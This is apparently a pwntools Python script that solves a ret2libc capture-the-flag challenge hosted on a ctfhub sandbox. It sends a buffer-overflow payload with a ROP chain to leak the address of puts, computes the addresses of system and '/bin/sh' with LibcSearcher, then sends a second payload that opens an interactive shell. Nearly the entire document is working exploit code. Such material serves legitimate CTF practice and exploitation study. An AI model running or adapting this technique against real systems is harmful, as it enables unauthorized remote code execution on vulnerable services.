from pwn import * 
from pwn import p64
from LibcSearcher import *

debug = 0
gdb_is = 0

# context(arch='i386',os = 'linux', log_level='DEBUG')
context(arch='amd64',os = 'linux', log_level='DEBUG')
if debug:
    context.terminal = ['/mnt/c/Users/sagiriking/AppData/Local/Microsoft/WindowsApps/wt.exe','nt','Ubuntu','-c']
    r = process("./ret2libc")
else:
    host = "challenge-f38e8af8d04198c9.sandbox.ctfhub.com"
    r = connect(host,27084)#远程连接
    gdb_is =0

if gdb_is:
    gdb.attach(r,'b* 0x400690')
    pause()
    pass

plt_puts = 0x4004e0
pop_rdi = 0x0400703

elf = ELF('./ret2libc')  
libc = ELF('./libc.so')

payload = b'A'*0x90 + b'junkjunk' + p64(pop_rdi) + p64(elf.got['puts'])  + p64(plt_puts) + p64(0x400626)#main
r.sendafter(b'ctfhub',payload)
r.recv()
response = r.recv(6)
puts_addr = u64(response.ljust(8,b'\x00')) 
libc=LibcSearcher('puts',puts_addr)
offset=puts_addr-libc.dump('puts')
binsh=offset+libc.dump('str_bin_sh')
system=offset+libc.dump('system')




payload = b'A'*0x90 + b'junkjunk' + p64(pop_rdi) + p64(binsh) + p64(system)
r.sendafter(b'ctfhub',payload)
r.interactive()

